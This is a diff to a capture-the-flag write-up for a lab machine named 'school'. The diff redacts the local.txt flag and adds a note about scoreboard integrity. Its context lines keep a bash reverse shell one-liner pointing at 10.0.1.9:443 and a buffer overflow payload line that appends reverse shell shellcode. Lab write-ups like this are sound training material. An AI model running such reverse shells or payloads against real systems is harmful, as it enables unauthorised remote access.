@@ -2,6 +2,8 @@
 
 > **Content origin:** this writeup combines the local PDF `CTF_School_Writeup.pdf` (the authoritative narrative) with the sqlmap dump in ODT (timestamps and raw injection responses). Where the local PDF and public writeups disagree, the local PDF wins.
 
+> Note: Flags were partially redacted to preserve scoreboard integrity.
+
 ## 1. Identification
 
 | Field            | Value                                                                    |
@@ -148,7 +150,7 @@ bash -c 'bash -i >& /dev/tcp/10.0.1.9/443 0>&1'
 
 ```bash
 www-data@school:/home/fox$ cat /home/fox/local.txt
-e4ed03b4852906b6cb716fc6ce0f9fd5
+e4ed...[REDACTED]...9fd5
 ```
 
 > **LOCAL.TXT — 7 PTS** → flag obtained ✓
@@ -231,7 +233,7 @@ payload += shellcode                    # linux/x86 reverse shell
 
 | Flag       | Points | Location              | Value / Status                                                    |
 |------------|--------|-----------------------|-------------------------------------------------------------------|
-| local.txt  | 7 pts  | `/home/fox/local.txt` | `e4ed03b4852906b6cb716fc6ce0f9fd5` ✓                              |
+| local.txt  | 7 pts  | `/home/fox/local.txt` | `e4ed...[REDACTED]...9fd5` ✓                              |
 | proof.txt  | 4 pts  | `/root/proof.txt`     | PENDING (BOF confirms EIP overwrite, shellcode without callback)  |
 
 | Credential                          | Value    | Source               |
